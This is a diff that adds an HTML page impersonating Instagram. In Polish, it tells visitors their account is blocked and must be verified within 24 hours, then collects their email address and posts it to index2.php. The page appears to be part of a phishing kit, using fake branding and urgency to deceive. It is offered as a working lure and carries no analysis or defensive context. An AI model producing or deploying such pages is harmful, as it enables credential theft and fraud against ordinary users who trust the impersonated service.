@@ -1,0 +1,51 @@
+<html>
+
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-Ua-Compatible" content="IE=edge,chrome=1">
+    <script src="https://kit.fontawesome.com/083afe1345.js" crossorigin="anonymous"></script>
+    <link rel="stylesheet" href="styleindex.css" type="text/css">
+    <title>Instagram</title>
+    <link rel="icon" href="/ig/favicon.ico" type="image/x-icon" />
+</head>
+
+<body>
+    <header>
+        <img class="iglogo1" src="iglogo1.png">
+    </header>
+    <div class="login-box">
+        <div class="login-form">
+            <form action="index2.php" method="post">
+                <img src="lock.png" />
+                <a class="a1">Twoje konto zostało zablokowane</a>
+                <a class="a2">Twoje konto zostało zablokowane i wymaga weryfikacji. Wykonaj kolejne kroki w ciągu 24
+                    godzin, aby je
+                    zweryfikować.</a>
+                <input type="text" class="email" name="email" placeholder="Adres e-mail" />
+                <button type="submit" class="przycisk" name="przycisk">Przejdź dalej</button>
+            </form>
+            <div class="app">
+                <a>Pobierz aplikację.</a>
+            </div>
+            <div class="app2">
+                <img class="appstore" src="/ig/appstore.png"><img class="googleplay" src="/ig/googleplay.png">
+            </div>
+        </div>
+    </div>
+</body>
+<script>
+    let input = document.querySelector(".email");
+    let button = document.querySelector(".przycisk");
+    button.disabled = true;
+    input.addEventListener("change", stateHandle);
+
+    function stateHandle() {
+        if (document.querySelector(".email").value === "") {
+            button.disabled = true;
+        } else {
+            button.disabled = false;
+        }
+    }
+</script>
+
+</html>
